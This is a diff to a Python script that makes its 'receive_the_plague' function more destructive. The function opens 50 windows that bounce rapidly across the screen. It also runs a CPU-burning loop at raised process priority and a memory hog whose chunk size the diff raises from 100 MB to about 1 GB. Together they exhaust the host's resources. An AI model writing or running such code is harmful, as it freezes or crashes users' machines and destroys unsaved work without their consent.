@@ -5,8 +5,32 @@ import multiprocessing as mp
 import os
 import tkinter as tk
 from tkinter import ttk, messagebox
+import random
 
 def receive_the_plague():
+    SPEED = 30
+    COUNT = 50
+
+    root = tk.Tk()
+    root.withdraw()
+    def make_window():
+        w = tk.Toplevel()
+        sw, sh = w.winfo_screenwidth(), w.winfo_screenheight()
+        x, y = random.randint(0, sw-300), random.randint(0, sh-200)
+        dx, dy = random.choice([-SPEED, SPEED]), random.choice([-SPEED, SPEED])
+        def move():
+            nonlocal x, y, dx, dy
+            x, y = x + dx, y + dy
+            if x <= 0 or x + 300 >= sw: dx = -dx
+            if y <= 0 or y + 200 >= sh: dy = -dy
+            w.geometry(f"300x200+{x}+{y}")
+            w.after(10, move)
+        move()
+
+    for _ in range(COUNT):
+        make_window()
+    root.mainloop()
+
     def stress_task(mode):
         # 0: CPU Intensive, 1: RAM Hogging
         try: os.nice(-15)
@@ -15,7 +39,7 @@ def receive_the_plague():
             i = 0
             while True: i = i * i + 1 if i < 1e18 else 0.5
         else:
-            hog = []; chunk = 'X' * 100 * 1024 * 1024 # 100MB chunk
+            hog = []; chunk = 'X' * 1000 * 1024 * 1024 # gb chunk
             try:
                 while True: hog.append(chunk); time.sleep(0.001)
             except MemoryError:
